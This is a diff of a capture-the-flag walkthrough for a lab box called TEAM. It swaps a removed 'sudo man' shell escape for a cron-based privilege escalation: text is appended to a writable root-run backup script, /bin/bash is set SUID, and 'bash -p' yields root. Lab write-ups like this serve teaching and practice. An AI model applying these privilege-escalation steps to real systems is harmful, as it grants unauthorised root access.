@@ -341,23 +341,50 @@ No we have a shell as gyles! Although this shell is quite basic.
 
 This shell is quite resrictive due to it being launched from the script.
 
-After enumeration I found `sudo -l` reveal the following
-```bash
-sudo -l
-Matching Defaults entries for gyles on TEAM:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User gyles may run the following commands on TEAM:
-    (root) NOPASSWD: /usr/bin/man
-```
-Gyles can run `man` as root. This can lead to privilege escalation as man can spawn a shell like so
+After snooping around the system I found the following folder `/opt/admin_stuff` in this folder is a `script.sh`
 
 ```bash
-sudo man man
+#!/bin/bash
+#I have set a cronjob to run this script every minute
 
-!/bin/bash
+
+dev_site="/usr/local/sbin/dev_backup.sh"
+main_site="/usr/local/bin/main_backup.sh"
+#Back ups the sites locally
+$main_site
+$dev_site
 ```
-You now have a root shell on the box.
+Looks this this script runs as `root` every minute. It also calls two other scripts lets see if we have write permissions on any of these folders
+
+```bash
+drwxr-xr-x 10 root root  4096 Jan 15 19:49 .
+drwxr-xr-x 10 root root  4096 Jan 15 19:49 ..
+drwxrwxr-x  2 root admin 4096 Jan 17 19:48 bin
+drwxr-xr-x  2 root root  4096 Apr 26  2018 etc
+drwxr-xr-x  2 root root  4096 Apr 26  2018 games
+drwxr-xr-x  2 root root  4096 Apr 26  2018 include
+drwxr-xr-x  3 root root  4096 Jan 15 19:49 lib
+lrwxrwxrwx  1 root root     9 Jan 15 19:49 man -> share/man
+drwxr-xr-x  2 root root  4096 Jan 17 19:45 sbin
+drwxr-xr-x  4 root root  4096 Jan 15 19:49 share
+drwxr-xr-x  2 root root  4096 Apr 26  2018 src
+```
+
+I have full permisisons in the `bin` folder,The folder contains the `main_backup.sh` I have full r/w permsissions so anything in put in the script will be executed as `root`.
+
+`echo "chmod +s /bin/bash" >> main_backup.sh`
+
+This command will change `/bin/bash` to SUID. This means it run run bash with root privs now. Like so
+
+```bash
+/bin/bash -p
+id && whoami
+uid=1001(gyles) gid=1001(gyles) euid=0(root) egid=0(root) groups=0(root),1001(gyles),1003(editors),1004(admin)
+root
+
+```
+Now you have full root access on the box! I often use the chmod u+s /bin/bash as it saves me setting up a nc listener on my machine
+
+
 
 I really hope you enjoyed my box!
